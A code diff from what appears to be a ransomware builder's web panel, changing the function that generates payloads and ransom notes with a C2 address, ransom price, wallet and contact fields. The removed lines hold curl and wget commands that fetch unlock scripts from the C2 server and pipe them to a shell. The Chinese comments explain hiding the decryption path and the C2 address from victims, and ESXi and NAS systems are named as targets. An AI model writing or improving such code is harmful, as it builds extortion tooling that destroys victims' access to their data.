@@ -755,31 +755,11 @@ def generate():
         tpl = tpl.replace('{{RSA_PUBLIC_KEY}}', open(pub_path).read().strip())
     else:
         return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
-    # 构建勒索信
-    srv = re.sub(r'/handshake(\.php)?$', '', c2)
-    if not srv: srv = 'http://<后台地址>'
-    # 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh（纯 openssl），
-    # Windows 用 jasmin_unlock.ps1（纯 PowerShell 7+，无需编译 exe）
-    if plat == 'win':
-        dec = ('Windows (requires PowerShell 7+)\n'
-               f'  curl.exe -sL {srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n'
-               f'  pwsh -File unlock.ps1 -Server {srv} -K "<passphrase>"')
-    elif plat in ('esxi','qnap','synology'):
-        # 三者都靠 SSH 进设备后用同一个零依赖脚本，但文案要说到点上 ——
-        # 此前一律写成 "Linux / macOS"，等于在勒索信里教受害者用错的方法。
-        _how = {
-            'esxi':     'SSH into the ESXi host (Host > Manage > Services > TSM-SSH)',
-            'qnap':     'first enable SSH: QNAP Control Panel > Network & File Services',
-            'synology': 'first enable SSH: Synology Control Panel > Terminal & SNMP',
-        }[plat]
-        dec = ('NAS / hypervisor host - POSIX shell (pure openssl, no dependencies required)\n'
-               f'  # {_how}\n'
-               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"\n'
-               f'  # if curl is unavailable:  wget -qO- {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
-    else:
-        dec = ('Linux / macOS (pure openssl, no dependencies required)\n'
-               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
-    dec += '\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)'
+    # ★ 勒索信正文【不含】任何解密教程/命令 —— 只保留识别信息(系统ID)与联系方式。
+    #   此前会按平台写入 jasmin_unlock.ps1 / jasmin_unlock.sh 的下载与执行命令，
+    #   等于把解密路径直接交给受害者，且明文暴露 C2 服务器地址。
+    #   操作员侧的完整步骤见后台「解密教程」面板与各主机行的「一键解密」展开。
+    #   形参 plat / c2 仍参与模板渲染（C2_URL），此处不再构造教程文案。
     _t = ransom['title']
     _sub = '' if 'ENCRYPT' in _t.upper() else '║  YOUR FILES HAVE BEEN ENCRYPTED\n'
     note = (f"╔══════════════════════════════════════════╗\n║  {_t}\n{_sub}"
@@ -787,8 +767,7 @@ def generate():
     if ransom['price']: note += f"\nRansom Amount: {ransom['price']}"
     if ransom['wallet']: note += f"\nPayment Address: {ransom['wallet']}"
     if ransom['contact']: note += f"\nContact: {ransom['contact']}"
-    note += (f"\n\nHow to Decrypt:\n{dec}\n\n"
-             "Sha-256 integrity verification guarantees 100% file restoration.")
+    note += "\n\nSha-256 integrity verification guarantees 100% file restoration."
     if plat in ('esxi','qnap','synology'):
         # 三个平台都是 POSIX sh，模板里的字符串字面量用单引号，转义规则相同。
         # 此前只判了 esxi，qnap/synology 掉进下面的 Python 分支用 \' 转义 ——
